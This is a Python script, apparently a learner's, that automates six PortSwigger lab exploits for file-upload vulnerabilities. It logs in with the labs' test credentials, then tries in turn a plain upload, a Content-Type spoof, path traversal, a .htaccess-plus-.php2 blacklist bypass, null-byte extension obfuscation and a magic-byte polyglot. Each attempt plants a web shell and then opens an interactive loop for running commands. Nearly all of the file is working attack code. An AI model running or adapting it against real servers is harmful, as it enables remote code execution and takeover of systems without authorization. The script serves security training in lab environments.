"""
This script automatically exploits six of the labs of portswigger:
1. Remote code execution via web shell upload
2. Web shell upload via Content-Type restriction bypass
3. Web shell upload via path traversal
4. Web shell upload via extension blacklist bypass
5. Web shell upload via obfuscated file extension
6. Remote code execution via polyglot web shell upload

Side note: The files has to be manually kept in.
""" 


import requests
import re
import payload_injection
import os
import dotenv
from pathlib import Path
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# session = requests.Session()
dotenv.load_dotenv()


class PortSwiggerExploit: 
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.file_location = ""
        self.file_name = ""
        self.session = requests.Session()

    def csrf_token_extract(self, url):
        url_get = self.session.get(url).text
        csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
        if csrf:
            return csrf
        return None
    
    def file_upload(self, csrf, additional_stuff=None, path_traversal=False, obsfucated_extension=False, magic_byte=False):
        if magic_byte:
            self.file_location = os.getenv('MAGIC_BYTE_FILE')
        else:
            self.file_location = os.getenv('FILE_TO_UPLOAD')
        self.file_name = Path(self.file_location).name
        file = ""
        if path_traversal:
            file = "..%2f" + self.file_name
        elif obsfucated_extension:
            file = self.file_name + "%00.png"
        else:
            file = self.file_name

        data={
            'csrf': csrf,
            'user':'wiener'
        }
        files = {
            "avatar": (file, open(self.file_location, "rb"), additional_stuff)
        }


        file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
        return file_upload_post.status_code
    
    def exploit(self, status_code, path_traversal=False):
        if status_code == 200:
            if path_traversal:
                exploit_url = f"{self.url}/files/{self.file_name}"
            else:
                exploit_url = f"{self.url}/files/avatars/{self.file_name}"
            if payload_injection.start_payload(exploit_url, "whoami")  == None: #testing if exploit works
                return False
            print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
            while True:
                payload = input("Enter your payload: ") 
                if payload == "stop":
                    break
                file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
                print(file_upload_web_shell)
            return True
        else:
            return False

    def simple_file_upload(self):
        print("Trying simple file upload")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf)
        return self.exploit(file_upload_post)

    def content_type_file_upload(self):
        print("Trying content type vulnerability")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, "image/png")
        return self.exploit(file_upload_post)

    def path_traversal(self):
        print("Trying local file inclusion")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, path_traversal=True)
        return self.exploit(file_upload_post, path_traversal=True)
    
    def blacklist_bypass(self):
        print("Trying to bypass blacklist")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        htaccess = {
                "avatar": (".htaccess", open(os.getenv('HTACCESS_FILE'), "rb"))
        }
        file = {
            "avatar": ("web_shell.php2", open(os.getenv('FILE_TO_UPLOAD'), "rb"))
        }
        data={
            'csrf': csrf,
            'user':'wiener'
        }
        htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
        if htaccess_upload_post.status_code != 200:
            return False
        
        file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=file, verify=False)
        if file_upload_post.status_code != 200:
            return False
        
        exploit_url = f"{url}/files/avatars/web_shell.php2"
        if payload_injection.start_payload(exploit_url, "whoami")  == None:
                return False
        print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
        while True:
            payload = input("Enter your payload: ") 
            if payload == "stop":
                break
            file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
            print(file_upload_web_shell)
        return True
    
    def null_byte_injection(self):
        print("Trying null byte injection")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, obsfucated_extension=True)
        return self.exploit(file_upload_post)
    
    def magic_byte_file_upload(self):
        print("Trying magic bytes")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, magic_byte=True)
        return self.exploit(file_upload_post)
        
        
    def login(self):
        csrf_token = self.csrf_token_extract(f"{self.url}/login")
        if csrf_token != None:
            login_info = {
                "username": "wiener", #credentials given in website
                "password": "peter", #credentials given in website
                "csrf": csrf_token 
            }
            self.login_page_post = self.session.post(url=f"{self.url}/login", verify=False, data=login_info, allow_redirects=True)
            if self.login_page_post.status_code == 200:
                if self.simple_file_upload():
                    pass
                elif self.content_type_file_upload():
                    pass
                elif self.path_traversal():
                    pass
                elif self.blacklist_bypass():
                    pass
                elif self.null_byte_injection():
                    pass
                elif self.magic_byte_file_upload():
                    pass
                else:
                    print("Bye bye ˙◠˙")

            else: print("Oops something went wrong ")
        else:
            print("csrf token not found -_-")

url = input("Enter the link to exploit: ")
start = PortSwiggerExploit(url)
start.login()